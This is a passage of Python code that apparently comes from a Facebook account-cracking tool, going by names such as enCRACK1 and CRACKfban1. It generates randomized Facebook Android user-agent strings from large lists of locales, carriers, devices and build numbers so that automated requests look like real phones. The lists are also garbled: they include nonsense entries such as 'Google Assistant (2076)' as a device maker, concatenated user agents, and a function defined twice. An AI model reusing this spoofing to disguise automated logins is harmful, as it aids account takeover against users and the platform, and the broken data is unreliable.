'so_SO', 'sq_MK', 'sr_ME', 'su_ID', 'sw_KE', 'tg_TJ', 'ta_IN', 'tt_RU', 'te_IN', 'th_KH', 'ti_ET', 'to_TO', 'ts_ZA', 'tn_BW', 'tr_CY', 'tk_TM', 'uz_UZ', 've_ZA', 'vo_001', 'wa_BE', 'wo_SN', 'xh_ZA', 'yi_US', 'yo_NG', 'zu_ZA']]
    fbrv = [f'FBRV/{num}' for num in ['541211947', '0', '537275962', '478477801', '475722615', '30034644', '479317306', '478970936', '478880211', '478478064', '478249893', '478037428', '477481714', '477125993', '476729007', '476465495', '476253783', '475744275', '475337385', '474931337', '474441042', '473917206', '473216533', '472359048', '471660229', '470651795', '469522557', '468531229', '467507693', '466724884', '465653504', '464476908', '463448586', '462393688', '461247332', '460085039', '458998020', '458028990', '456759719', '455597378', '454650357', '453687517', '452531181', '451275304', '450172551', '448983014', '447787030', '446453875', '444891874', '443722429', '442395281', '440700434', '438152587', '435465179', '432878540', '429953098', '426467586', '422958444', '420325899', '417597586', '414273080', '410852912', '407639217', '404425199', '401334144', '398187692', '395097061', '392031060', '389015326', '385772744', '382508485', '379209121', '375911389', '372587842', '369277756', '365938936', '362630531', '359289291', '355969540', '352579744', '349298014', '345964358', '342553169', '339190213', '335852353', '332440744', '329140261', '325843309', '322505412', '319171616', '315872340', '312514289', '309220097', '305913356', '302625731', '299290432', '295952127', '292620569', '289287935', '285950460', '282602451', '279317302', '275970156', '272630402', '269296165', '265978679', '262625013', '259281689', '255942133', '252602470', '249300742', '245966906', '242651116', '239291759', '235963618', '232609215', '229298064', '225977275', '222610496', '219292266', '215979260', '212653107', '209291682', '205988690', '202672005', '199343264', '195989604', '192675462', '189343227', '185989722', '182674360', '179329186', '175993336', '172634134', '169307012', '165982720', '162644551', '159324610', '155985430', '152643544', '149308748', '145985537', '142640018', '139328299', '135988582', '132637181', '129325659', '125992176', '122638086', '119325324']]
    fbcr = [f'FBCR/{c}' for c in ['Verizon Wireless', 'AT&T', 'Sprint', 'T-Mobile', 'Metro by T-Mobile', 'US Cellular', 'Boost Mobile', 'Cricket Wireless', 'TracFone Wireless', 'Xfinity Mobile', 'Consumer Cellular', 'C Spire Wireless', 'Google Fi', 'Republic Wireless', 'Spectrum Mobile', 'Visible', 'Net10 Wireless', 'Simple Mobile', 'Page Plus Cellular', 'H2O Wireless', 'Red Pocket Mobile', 'Total Wireless', 'Reach Mobile', 'Gen Mobile', 'Twigby', 'Tello', 'Mint Mobile']]
    fbmf = [f'FBMF/{c}' for c in ['HMD Global', 'TECNO', 'Samsung', 'OnePlus', 'Google', 'Xiaomi', 'Apple', 'HTC', 'LG', 'Sony', 'Motorola', 'Huawei', 'OPPO', 'Vivo', 'Realme', 'Nokia', 'Asus', 'Lenovo', 'ZTE', 'Alcatel', 'Amazon', 'Razer', 'Essential', 'BlackBerry', 'Microsoft', 'Meizu', 'Palm', 'Nextbit', 'LeEco', 'Sharp', 'TCL', 'Google Pixel', 'Google Nexus', 'Google Pixelbook', 'Google Pixel Slate', 'Google Home', 'Google Chromecast', 'Google Nest', 'Google Stadia', 'Google Wifi', 'Google Daydream', 'Google Glass', 'Google Cardboard', 'Google Clips', 'Google Jamboard', 'Google OnHub', 'Google Pixel Buds', 'Google Pixel Stand', 'Google Titan Security Key', 'Google Titan Security Key Mini', 'Google USB Type-C Earbuds', 'Google USB-C to 3.5mm Headphone Adapter', 'Google Nest Hub', 'Google Nest Hub Max', 'Google Nest Mini', 'Google Nest Wifi', 'Google Pixel 4', 'Google Pixel 4 XL', 'Google Pixel 3', 'Google Pixel 3 XL', 'Google Pixel 3a', 'Google Pixel 3a XL', 'Google Pixel 2', 'Google Pixel 2 XL', 'Google Pixel', 'Google Pixel XL', 'Google Pixel C', 'Google Home Mini', 'Google Home Max', 'Google Nest Hub Max', 'Google Nest Hub', 'Google Chromecast', 'Google Chromecast Ultra', 'Google Chromecast Audio', 'Google Wifi', 'Google Nest Wifi', 'Google Daydream View', 'Google Daydream View (2017)', 'Google Cardboard', 'Google Cardboard (2015)', 'Google Clips', 'Google Jamboard', 'Google Pixel Buds', 'Google Pixel Buds (2017)', 'Google Pixel Buds (2020)', 'Google Pixel Stand', 'Google Titan Security Key', 'Google Titan Security Key Mini', 'Google USB Type-C Earbuds', 'Google USB-C to 3.5mm Headphone Adapter', 'Google Assistant', 'Google Assistant (2016)', 'Google Assistant (2017)', 'Google Assistant (2018)', 'Google Assistant (2019)', 'Google Assistant (2020)', 'Google Assistant (2021)', 'Google Assistant (2022)', 'Google Assistant (2023)', 'Google Assistant (2024)', 'Google Assistant (2025)', 'Google Assistant (2026)', 'Google Assistant (2027)', 'Google Assistant (2028)', 'Google Assistant (2029)', 'Google Assistant (2030)', 'Google Assistant (2031)', 'Google Assistant (2032)', 'Google Assistant (2033)', 'Google Assistant (2034)', 'Google Assistant (2035)', 'Google Assistant (2036)', 'Google Assistant (2037)', 'Google Assistant (2038)', 'Google Assistant (2039)', 'Google Assistant (2040)', 'Google Assistant (2041)', 'Google Assistant (2042)', 'Google Assistant (2043)', 'Google Assistant (2044)', 'Google Assistant (2045)', 'Google Assistant (2046)', 'Google Assistant (2047)', 'Google Assistant (2048)', 'Google Assistant (2049)', 'Google Assistant (2050)', 'Google Assistant (2051)', 'Google Assistant (2052)', 'Google Assistant (2053)', 'Google Assistant (2054)', 'Google Assistant (2055)', 'Google Assistant (2056)', 'Google Assistant (2057)', 'Google Assistant (2058)', 'Google Assistant (2059)', 'Google Assistant (2060)', 'Google Assistant (2061)', 'Google Assistant (2062)', 'Google Assistant (2063)', 'Google Assistant (2064)', 'Google Assistant (2065)', 'Google Assistant (2066)', 'Google Assistant (2067)', 'Google Assistant (2068)', 'Google Assistant (2069)', 'Google Assistant (2070)', 'Google Assistant (2071)', 'Google Assistant (2072)', 'Google Assistant (2073)', 'Google Assistant (2074)', 'Google Assistant (2075)', 'Google Assistant (2076)']]
    fbbd = [f'FBBD/{c}' for c in ['Samsung', 'Apple', 'Google', 'Xiaomi', 'OnePlus', 'Huawei', 'OPPO', 'Vivo', 'Realme', 'Nokia', 'Sony', 'LG', 'Motorola', 'HTC', 'ASUS', 'Lenovo', 'ZTE', 'Alcatel', 'Amazon', 'Razer', 'Essential', 'BlackBerry', 'Microsoft', 'Meizu', 'Palm', 'Nextbit', 'LeEco', 'Sharp', 'TCL', 'Google Pixel', 'Google Nexus', 'Google Pixelbook', 'Google Pixel Slate', 'Google Home', 'Google Chromecast', 'Google Nest', 'Google Stadia', 'Google Wifi', 'Google Daydream', 'Google Glass', 'Google Cardboard', 'Google Clips', 'Google Jamboard', 'Google OnHub', 'Google Pixel Buds', 'Google Pixel Stand', 'Google Titan Security Key', 'Google Titan Security Key Mini', 'Google USB Type-C Earbuds', 'Google USB-C to 3.5mm Headphone Adapter', 'Google Nest Hub', 'Google Nest Hub Max', 'Google Nest Mini', 'Google Nest Wifi', 'Google Pixel 4', 'Google Pixel 4 XL', 'Google Pixel 3', 'Google Pixel 3 XL', 'Google Pixel 3a', 'Google Pixel 3a XL', 'Google Pixel 2', 'Google Pixel 2 XL', 'Google Pixel', 'Google Pixel XL', 'Google Pixel C', 'Google Home Mini', 'Google Home Max', 'Google Nest Hub Max', 'Google Nest Hub', 'Google Chromecast', 'Google Chromecast Ultra', 'Google Chromecast Audio', 'Google Wifi', 'Google Nest Wifi', 'Google Daydream View', 'Google Daydream View (2017)', 'Google Cardboard', 'Google Cardboard (2015)', 'Google Clips', 'Google Jamboard', 'Google Pixel Buds', 'Google Pixel Buds (2017)', 'Google Pixel Buds (2020)', 'Google Pixel Stand', 'Google Titan Security Key', 'Google Titan Security Key Mini', 'Google USB Type-C Earbuds', 'Google USB-C to 3.5mm Headphone Adapter', 'Google Assistant', 'Google Assistant (2016)', 'Google Assistant (2017)', 'Google Assistant (2018)', 'Google Assistant (2019)', 'Google Assistant (2020)', 'Google Assistant (2021)', 'Google Assistant (2022)', 'Google Assistant (2023)', 'Google Assistant (2024)', 'Google Assistant (2025)', 'Google Assistant (2026)', 'Google Assistant (2027)', 'Google Assistant (2028)', 'Google Assistant (2029)', 'Google Assistant (2030)', 'Google Assistant (2031)', 'Google Assistant (2032)', 'Google Assistant (2033)', 'Google Assistant (2034)', 'Google Assistant (2035)', 'Google Assistant (2036)', 'Google Assistant (2037)', 'Google Assistant (2038)', 'Google Assistant (2039)', 'Google Assistant (2040)']]
    fbpn = ['com.facebook.katana', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.mlite', 'com.facebook.wakizashi', 'com.facebook.alohawrapper', 'com.facebook.arstudio.player', 'com.facebook.gaming', 'com.facebook.work', 'com.facebook.threads', 'com.facebook.pages.app', 'com.facebook.shop', 'com.facebook.bonfire', 'com.facebook.gameroom', 'com.facebook.creatorstudio', 'com.facebook.intern', 'com.facebook.feed', 'com.facebook.oz', 'com.facebook.kaios', 'com.facebook.atlas', 'com.facebook.hyperloop', 'com.facebook.katana.dev', 'com.facebook.system', 'com.facebook.system.dev', 'com.facebook.services', 'com.facebook.services.dev', 'com.facebook.appmanager', 'com.facebook.appmanager.dev', 'com.facebook.katana.orca', 'com.facebook.loom', 'com.facebook.lite.dev', 'com.facebook.orca.dev', 'com.facebook.mlite.dev', 'com.facebook.wakizashi.dev', 'com.facebook.alohawrapper.dev', 'com.facebook.arstudio.player.dev', 'com.facebook.gaming.dev', 'com.facebook.work.dev', 'com.facebook.threads.dev', 'com.facebook.pages.app.dev', 'com.facebook.shop.dev', 'com.facebook.bonfire.dev', 'com.facebook.gameroom.dev', 'com.facebook.creatorstudio.dev', 'com.facebook.intern.dev', 'com.facebook.feed.dev', 'com.facebook.oz.dev', 'com.facebook.kaios.dev', 'com.facebook.atlas.dev', 'com.facebook.hyperloop.dev', 'com.facebook.system.dev', 'com.facebook.services.dev', 'com.facebook.appmanager.dev', 'com.facebook.katana.orca.dev', 'com.facebook.loom.dev']
    fbdv = ['FBDV/iPhone12,1', 'FBDV/iPhone11,8', 'FBDV/iPhone10,6', 'FBDV/iPhone9,4', 'FBDV/iPhone8,1', 'FBDV/iPhone7,2', 'FBDV/iPhone6,2', 'FBDV/Samsung SM-G998U', 'FBDV/Samsung SM-G991U', 'FBDV/Samsung SM-G9980', 'FBDV/Samsung SM-G9910', 'FBDV/Samsung SM-N986B', 'FBDV/Samsung SM-N981B', 'FBDV/Google Pixel 5', 'FBDV/Google Pixel 4a', 'FBDV/Google Pixel 3 XL', 'FBDV/Google Pixel 2', 'FBDV/OnePlus IN2015', 'FBDV/OnePlus IN2025', 'FBDV/OnePlus KB2005', 'FBDV/OnePlus KB2001', 'FBDV/Xiaomi Redmi Note 10', 'FBDV/Xiaomi Redmi Note 9', 'FBDV/Xiaomi Mi 11', 'FBDV/Xiaomi Mi 10T', 'FBDV/Huawei ELS-NX9', 'FBDV/Huawei ELS-N04', 'FBDV/Huawei EVR-N29', 'FBDV/Huawei EVR-L29', 'FBDV/LG LM-V450', 'FBDV/LG LM-Q910', 'FBDV/LG LM-G820', 'FBDV/LG LM-Q730', 'FBDV/Sony Xperia 1 III', 'FBDV/Sony Xperia 5 III', 'FBDV/Sony Xperia 10 III', 'FBDV/Sony Xperia 1 II', 'FBDV/Motorola XT2125-4', 'FBDV/Motorola XT2113-3', 'FBDV/Motorola XT2125-3', 'FBDV/Motorola XT2115-1', 'FBDV/Nokia TA-1321', 'FBDV/Nokia TA-1335', 'FBDV/Nokia TA-1337', 'FBDV/Nokia TA-1322', 'FBDV/Asus_I003D', 'FBDV/Asus_I003DD', 'FBDV/Asus_I003DA', 'FBDV/Asus_I003DB', 'FBDV/Lenovo TB-X606F', 'FBDV/Lenovo TB-X606X', 'FBDV/Lenovo TB-X606V', 'FBDV/Lenovo TB-X606', 'FBDV/ZTE N928Dt', 'FBDV/ZTE A2021', 'FBDV/ZTE N928D', 'FBDV/ZTE A2020G', 'FBDV/Alcatel 5033D', 'FBDV/Alcatel 5033Y', 'FBDV/Alcatel 5033A', 'FBDV/Alcatel 5033X', 'FBDV/Amazon KDFOWI', 'FBDV/Amazon KFSUWI', 'FBDV/Amazon KFSAWI', 'FBDV/Amazon KFDOWI', 'FBDV/Razer Phone', 'FBDV/Razer Phone 2', 'FBDV/Razer Phone 3', 'FBDV/Essential Products PH-1', 'FBDV/Essential Products PH-2', 'FBDV/BlackBerry BBE100-2', 'FBDV/BlackBerry BBE100-5', 'FBDV/BlackBerry BBE100-4', 'FBDV/BlackBerry BBE100-1', 'FBDV/Microsoft RM-1091', 'FBDV/Microsoft RM-1109', 'FBDV/Microsoft RM-1077', 'FBDV/Microsoft RM-1089', 'FBDV/Meizu M882Q', 'FBDV/Meizu M882H', 'FBDV/Meizu M882A', 'FBDV/Meizu M882J', 'FBDV/Palm PVG100', 'FBDV/Palm PVG100E', 'FBDV/Palm PVG100EU', 'FBDV/Palm PVG100EAWW', 'FBDV/Nextbit Robin', 'FBDV/Nextbit Robin 2', 'FBDV/Nextbit Robin 3', 'FBDV/Nextbit Robin 4', 'FBDV/LeEco LEX622', 'FBDV/LeEco LEX720', 'FBDV/LeEco LEX727', 'FBDV/LeEco LEX725', 'FBDV/Sharp Z3', 'FBDV/Sharp Z2', 'FBDV/Sharp Z1', 'FBDV/Sharp Z4', 'FBDV/TCL 10 SE', 'FBDV/TCL 10 Plus', 'FBDV/TCL 10L', 'FBDV/TCL 10 Pro', 'FBDV/Google Pixel Slate', 'FBDV/Google Pixelbook', 'FBDV/Google Pixelbook Go', 'FBDV/Google Pixel C', 'FBDV/Google Nexus 10', 'FBDV/Google Nexus 9', 'FBDV/Google Nexus 7', 'FBDV/Google Nexus 6P', 'FBDV/Google Nexus 6', 'FBDV/Google Nexus 5X', 'FBDV/Google Nexus 5', 'FBDV/Google Nexus 4', 'FBDV/Google Glass', 'FBDV/Google Home', 'FBDV/Google Home Mini', 'FBDV/Google Home Max', 'FBDV/Google Nest Hub', 'FBDV/Google Nest Hub Max', 'FBDV/Google Nest Mini', 'FBDV/Google Nest Audio', 'FBDV/Google Chromecast', 'FBDV/Google Chromecast Ultra', 'FBDV/Google Chromecast Audio', 'FBDV/Google Pixel Buds']
    fbsv = [f'FBSV/{i}' for i in range(80)]
    fbop = [f'FBOP/{i}' for i in range(1, 201)]
    fbca = ['FBCA/arm64-v8a;FBMF/Samsung;FBBD/Galaxy S21 Ultra;FBSV/11;FBDM/{density=3.0,width=1440,height=3088};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/OnePlus;FBBD/OnePlus 9 Pro;FBSV/11;FBDM/{density=3.0,width=1440,height=3216};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Xiaomi;FBBD/Mi 11 Ultra;FBSV/11;FBDM/{density=3.0,width=1440,height=3200};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Apple;FBBD/iPhone 13 Pro Max;FBSV/15;FBDM/{density=3.0,width=1284,height=2778};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Google;FBBD/Pixel 6 Pro;FBSV/13;FBDM/{density=3.5,width=1440,height=3120};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/OPPO;FBBD/Find X5 Pro;FBSV/12;FBDM/{density=3.0,width=1440,height=3200};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Vivo;FBBD/iQOO 9 Pro;FBSV/12;FBDM/{density=3.0,width=1440,height=3216};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Realme;FBBD/Realme GT 2 Pro;FBSV/12;FBDM/{density=3.0,width=1440,height=3200};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Nokia;FBBD/Nokia G50;FBSV/12;FBDM/{density=2.0,width=720,height=1600};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Sony;FBBD/Xperia 1 III;FBSV/11;FBDM/{density=3.0,width=1644,height=3840};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Motorola;FBBD/Moto G Stylus 5G;FBSV/11;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Huawei;FBBD/Mate 40 Pro;FBSV/10;FBDM/{density=3.0,width=1344,height=2772};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/OPPO;FBBD/Reno6 Pro;FBSV/11;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Vivo;FBBD/X60 Pro+;FBSV/11;FBDM/{density=3.0,width=1080,height=2376};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Realme;FBBD/Realme 8 Pro;FBSV/11;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Nokia;FBBD/Nokia X20;FBSV/11;FBDM/{density=2.5,width=1080,height=2408};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Sony;FBBD/Xperia 10 III;FBSV/11;FBDM/{density=3.0,width=1080,height=2520};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Motorola;FBBD/Moto G Power (2021);FBSV/11;FBDM/{density=3.0,width=1080,height=2340};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Huawei;FBBD/P40 Pro;FBSV/10;FBDM/{density=3.0,width=1200,height=2640};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/OnePlus;FBBD/Nord N200 5G;FBSV/11;FBDM/{density=2.0,width=720,height=1600};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Samsung;FBBD/Galaxy A52 5G;FBSV/11;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Xiaomi;FBBD/Redmi Note 10 Pro;FBSV/11;FBDM/{density=3.5,width=1080,height=2400};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBAN/FB4A;FBAV/442.0.0.44.114;FBBV/541369658;FBAN/FB4A;FBAV/440.0.0.31.105;FBBV/534746244;FBAN/FB4A;FBAV/415.0.0.34.107;FBBV/475722615;FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;', 'FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBDM/{density=1.75,width=720,height=1515};FBLC/en_US;FBRV/541211947;', 'FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBAN/FB4A;FBAV/442.0.0.44.114;FBBV/541369658;FBDM/{density=1.75,width=720,height=1478};FBLC/en_US;FBRV/0;FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBDM/{density=1.75,width=720,height=1421};FBLC/en_US;FBRV/0;', 'FBAN/FB4A;FBAV/440.0.0.31.105;FBBV/534746244;FBDM/{density=2.5,width=1080,height=2224};FBLC/en_US;FBRV/537275962;FBAN/FB4A;FBAV/415.0.0.34.107;FBBV/475722615;FBDM/{density=2.7875001,width=1080,height=2165};FBLC/es_LA;FBRV/478477801;', 'FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBRV/537275962;FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBDM/{density=1.75,width=720,height=1515};FBLC/en_US;FBRV/541211947;', 'FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBAN/FB4A;FBAV/442.0.0.44.114;FBBV/541369658;FBAN/FB4A;FBAV/440.0.0.31.105;FBBV/534746244;FBAN/FB4A;FBAV/415.0.0.34.107;FBBV/475722615;FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;', 'FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBDM/{density=1.75,width=720,height=1515};FBLC/en_US;FBRV/541211947;', 'FBAN/FB4A;FBAV/442.0.0.44.114;FBBV/541369658;FBDM/{density=1.75,width=720,height=1478};FBLC/en_US;FBRV/0;', 'FBAN/FB4A;FBAV/440.0.0.31.105;FBBV/534746244;FBDM/{density=2.5,width=1080,height=2224};FBLC/en_US;FBRV/537275962;', 'FBAN/FB4A;FBAV/415.0.0.34.107;FBBV/475722615;FBDM/{density=2.7875001,width=1080,height=2165};FBLC/es_LA;FBRV/478477801;', 'FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBRV/537275962;']
    SUBI = ';'.join(random.choice(part) for part in [fban_fb4a, fbav, fbbv, fban_fb4a, fbav, fbbv, fbdm, fblc, fbrv, fbcr, fbmf, fbbd, fbpn, fbdv, fbsv, fbop, fbca])
    return SUBI
#----------------------------[DEF4]--------------------------------------------------------------------------------------------------------------------------------#
def DEF4():
    uaz = "[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918989;FBDM/{density=1.7,width=720,height=1385};FBLC/id_ID;FBRV/344561895;FBCR/AXIS;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/RMX1805;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    uaz1 = "[FBAN/FB4A;FBAV/261.0.0.52.126;FBBV/202681565;FBDM/{density=2.0,width=720,height=1352};FBLC/it_IT;FBRV/203912779;FBCR/ho.;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00RD;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    uaz2 = "[FBAN/FB4A;FBAV/265.0.0.61.103;FBBV/208173642;FBDM/{density=2.625,width=1080,height=2047};FBLC/en_US;FBRV/209076735;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    uaz3 = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=3.0,width=1080,height=2192};FBLC/en_US;FBRV/210347457;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z4;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    uaz4 = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/210430229;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    uaz5 = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=2.625,width=1080,height=2064};FBLC/en_US;FBRV/210658448;FBCR/Spectrum;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N970U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    uaz6 = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629374;FBDM/{density=4.0,width=1440,height=2768};FBLC/en_US;FBRV/210796532;FBCR/Republic;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U1;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    uaz7 = "[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681957;FBDM/{density=3.5,width=1440,height=2759};FBLC/en_US;FBRV/212345419;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N976V;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    uaz8 = "[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681925;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBRV/212646349;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1710-02;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    uaz9 = "[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027763;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/209644275;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    uaz10 = "[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/385537828;FBDM/{density=2.0,width=720,height=1384};FBLC/ru_RU;FBRV/386809220;FBCR/LMT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600FN;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    uaz11 = "[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636710;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/0;FBCR/Idea - Be Safe;FBMF/GIONEE;FBBD/GIONEE;FBPN/com.facebook.katana;FBDV/GIONEE F205 Pro;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    uaz12 = "[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845465;FBDM/{density=2.0,width=1536,height=2048};FBLC/en_US;FBRV/218114099;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T713;FBSV/7.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    uaz13 = "[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237439;FBDM/{density=1.7,width=720,height=1469};FBLC/hi_IN;FBRV/0;FBCR/Jio 4G;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1911;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    uaz14 = "[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/{density=2.75,width=1080,height=2030};FBLC/uk_UA;FBRV/227809097;FBCR/Vodafone UA;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    uaz15 = "[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783074;FBDM/{density=2.625,width=1080,height=2047};FBLC/en_US;FBRV/214205475;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    uaz16 = "[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231020946;FBDM/{density=1.5,width=480,height=782};FBLC/en_GB;FBRV/0;FBCR/VodaCom-SA;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/VFD 510;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    uaz17 = "[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021049;FBDM/{density=3.375,width=1080,height=2032};FBLC/it_IT;FBRV/232416429;FBCR/1 MOBILE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/FIG-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    uaz18 = "[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231020883;FBDM/{density=3.0,width=1080,height=1792};FBLC/en_US;FBRV/233720555;FBCR/Telekom.de;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VTR-L09;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    uaz19 = "[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/385537805;FBDM/{density=2.75,width=1080,height=2131};FBLC/uk_UA;FBRV/387081651;FBCR/Vodafone UA;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    uaz20 = "[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897985;FBDM/{density=3.375,width=1080,height=1920};FBLC/ru_RU;FBRV/374252804;FBCR/A1 BY;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    agent = random.choice([uaz,uaz1,uaz2,uaz3,uaz4,uaz5,uaz6,uaz7,uaz8,uaz9,uaz10,uaz11,uaz12,uaz13,uaz14,uaz15,uaz16,uaz17,uaz18,uaz19,uaz20])
    xyx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + agent
    return xyx
#----------------------------[DEF4]--------------------------------------------------------------------------------------------------------------------------------#
def DEF4():
    fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
    enCRACK1 = ['en_GB','en_US']
    CRACKfban1 = [ 'MessengerLite', 'MobileAdsManagerAndroid', 'Orca-Android', 'FB4A', 'FB4A']
